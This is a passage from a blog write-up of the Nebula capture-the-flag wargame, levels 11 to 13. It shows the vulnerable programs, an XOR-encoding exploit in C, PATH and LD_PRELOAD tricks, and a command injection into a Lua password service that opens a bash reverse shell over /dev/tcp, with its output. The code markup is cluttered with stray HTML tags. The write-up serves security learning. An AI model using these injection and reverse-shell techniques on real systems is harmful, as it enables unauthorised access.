</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">CL</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Content</span><span class="o">-</span><span class="nl">Length</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">mem</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">path</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">reading</span> <span class="n">from</span> <span class="n">stdin</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">CL</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">invalid</span> <span class="n">header</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">length</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">));</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">!=</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">fread</span> <span class="n">length</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="n">process</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">blue</span> <span class="o">=</span> <span class="n">length</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">pink</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="n">fd</span> <span class="o">=</span> <span class="n">getrand</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">path</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="n">blue</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;blue = %d, length = %d, &quot;</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">pink</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;pink = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">pink</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;fread fail(blue = %d, length = %d)&quot;</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">blue</span> <span class="o">-=</span> <span class="n">pink</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;mmap&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">process</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>The <code>fread(buf, length, 1, stdin)</code> always returns 1 as we can read in the unix manual:
<code>fread()  and  fwrite()  return the number of items successfully read or written (i.e., not the number of characters).</code></p>

<p>Here <code>if(length &lt; sizeof(buf)) {</code> we have two ways to progress. I suppose
having two solutions means calling <code>process()</code> from the different parts of code.</p>

<p>The first way is setting &ldquo;Content-Length: 1&rdquo;. The buffer is XORed using the simple algorithm below, this time the &lsquo;for&rsquo; cycle runs only once.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'>  <span class="n">key</span> <span class="o">=</span> <span class="n">length</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xff</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
</span><span class='line'>      <span class="n">key</span> <span class="o">-=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>  <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ ruby -e &lsquo;print &ldquo;Content-Length: 1\nA&rdquo;&rsquo; | /home/flag11/flag11
</span><span class='line'>sh: @: command not found&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ ruby -e &lsquo;print &ldquo;Content-Length: 1\n&rdquo; + (&ldquo;A&rdquo;.ord ^ 0x01).chr&rsquo;  | /home/flag11/flag11
</span><span class='line'>sh: $&lsquo;A\300Q&rsquo;: command not found&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ ruby -e &lsquo;print &ldquo;Content-Length: 1\n&rdquo; + (&ldquo;A&rdquo;.ord ^ 0x01).chr&rsquo;  | /home/flag11/flag11
</span><span class='line'>sh: -c: line 0: unexpected EOF while looking for matching ``&lsquo;
</span><span class='line'>sh: -c: line 1: syntax error: unexpected end of file&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ ruby -e &lsquo;print &ldquo;Content-Length: 1\n&rdquo; + (&ldquo;A&rdquo;.ord ^ 0x01).chr&rsquo;  | /home/flag11/flag11
</span><span class='line'>sh: A: command not found</span></code></pre></td></tr></table></div></figure></p>

<p>Because the buffer with &lsquo;A&rsquo; character is not NULL terminated and contains
uninitialized data, we use the technique described here <a href="http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/">Controlling uninitialized memory with LD_PRELOAD</a>
to have more luck with terminating &lsquo;A&rsquo;.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ ln -sf /bin/getflag /tmp/A
</span><span class='line'>sh-4.2$ export PATH=/tmp:$PATH&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ export LD_PRELOAD=$(ruby -e &lsquo;print &ldquo;\n&rdquo; * 50&rsquo;)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ ruby -e &lsquo;print &ldquo;Content-Length: 1\n&rdquo; + (&ldquo;A&rdquo;.ord ^ 0x01).chr&rsquo;  | /home/flag11/flag11
</span><span class='line'>getflag is executing on a non-flag account, this doesn&rsquo;t count</span></code></pre></td></tr></table></div></figure></p>

<p>The getflag runs, albeit there is a bug in the binary, because the new process
is created using <code>system()</code>, so it wasn&rsquo;t possible to get flag11 privileges.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>man 3 system&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>  Do not use system() from a program with set-user-ID or set-group-ID privileges,
</span><span class='line'>  because strange values for some environment variables might be used to subvert
</span><span class='line'>  system integrity. Use the exec(3) family of functions instead, but not
</span><span class='line'>  execlp(3) or execvp(3). system() will not, in fact, work properly from
</span><span class='line'>  programs with set-user-ID or set-group-ID privileges on systems on which
</span><span class='line'>  /bin/sh is bash version 2, since bash 2 drops privileges on startup. (Debian
</span><span class='line'>  uses a modified bash which does not do this when invoked as sh.)</span></code></pre></td></tr></table></div></figure></p>

<p>The second way is to use input with the length at least 1024. The decryption
routine is almost symmetric. However, in this step <code>key -= buffer[i];</code> we need
to substract from key the original value, so we XOR it with the key again.</p>

<p><figure class='code'><figcaption><span>exploit11.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="p">;</span>
</span><span class='line'><span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">length</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span><span class='line'><span class="kt">char</span> <span class="n">cmd</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;/bin/getflag&quot;</span><span class="p">;</span>
</span><span class='line'><span class="kt">int</span>  <span class="n">cmd_length</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">memcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">cmd_length</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="n">length</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xff</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">=</span> <span class="n">cmd_length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">-=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">&quot;Content-Length: 1024</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="n">fwrite</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ export TEMP=/tmp
</span><span class='line'>sh-4.2$ ./exploit11 | /home/flag11/flag11
</span><span class='line'>blue = 1024, length = 1024, pink = 1024
</span><span class='line'>getflag is executing on a non-flag account, this doesn&rsquo;t count</span></code></pre></td></tr></table></div></figure></p>

<h2>Level12</h2>

<p>The code below should be backdoored:</p>

<p><figure class='code'><figcaption><span>level12.lua</span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='lua'><span class='line'><span class="kd">local</span> <span class="n">socket</span> <span class="o">=</span> <span class="nb">require</span><span class="p">(</span><span class="err">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">socket</span><span class="err">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span><span class='line'><span class="kd">local</span> <span class="n">server</span> <span class="o">=</span> <span class="nb">assert</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="err">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mf">127.0.0.1</span><span class="err">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mi">50001</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">function</span> <span class="nf">hash</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</span><span class='line'>  <span class="n">prog</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="err">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">echo</span> <span class="err">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">..</span><span class="n">password</span><span class="o">..</span><span class="err">&amp;</span><span class="n">ldquo</span><span class="p">;</span> <span class="err">|</span> <span class="n">sha1sum</span><span class="err">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="err">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">r</span><span class="err">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">prog</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="err">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">*</span><span class="n">all</span><span class="err">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span><span class='line'>  <span class="n">prog</span><span class="p">:</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">data</span> <span class="o">=</span> <span class="nb">string.sub</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">40</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="n">data</span>
</span><span class='line'><span class="k">end</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">while</span> <span class="mi">1</span> <span class="k">do</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">client</span> <span class="o">=</span> <span class="n">server</span><span class="p">:</span><span class="n">accept</span><span class="p">()</span>
</span><span class='line'>  <span class="n">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="err">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Password</span><span class="p">:</span> <span class="err">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span><span class='line'>  <span class="n">client</span><span class="p">:</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">line</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">client</span><span class="p">:</span><span class="n">receive</span><span class="p">()</span>
</span><span class='line'>  <span class="k">if</span> <span class="ow">not</span> <span class="n">err</span> <span class="k">then</span>
</span><span class='line'>      <span class="nb">print</span><span class="p">(</span><span class="err">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">trying</span> <span class="err">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">..</span> <span class="n">line</span><span class="p">)</span> <span class="err">&amp;</span><span class="n">ndash</span><span class="p">;</span> <span class="n">log</span> <span class="n">from</span> <span class="n">where</span> <span class="p">;</span><span class="err">\</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">h</span> <span class="o">=</span> <span class="n">hash</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="k">if</span> <span class="n">h</span> <span class="o">~=</span> <span class="s2">&quot;</span><span class="s">4754a4f4bd5787accd33de887b9250a0691dd198&quot;</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Better luck next time</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>      <span class="n">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Congrats, your token is 413**CARRIER LOST**</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">end</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">client</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>With <code>io.popen</code> we can invoke arbitrary command using several techniques. We
use command substitution and two screens to gain reverse shell using bash:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Window1:
</span><span class='line'>sh-4.2$ nc -l 1337&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Window2:
</span><span class='line'>sh-4.2$ nc 0 50001
</span><span class='line'>Password: $(bash -i >&amp; /dev/tcp/0.0.0.0/1337 0>&amp;1)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Window1:
</span><span class='line'>bash: no job control in this shell
</span><span class='line'>flag12@nebula:/$ id
</span><span class='line'>id
</span><span class='line'>uid=987(flag12) gid=987(flag12) groups=987(flag12)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>flag12@nebula:/$ getflag
</span><span class='line'>getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure></p>

<h2>Level13</h2>

<p>The vulnerable program checks if the user does match the specific user id.</p>

<p><figure class='code'><figcaption><span>leve13_safe.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
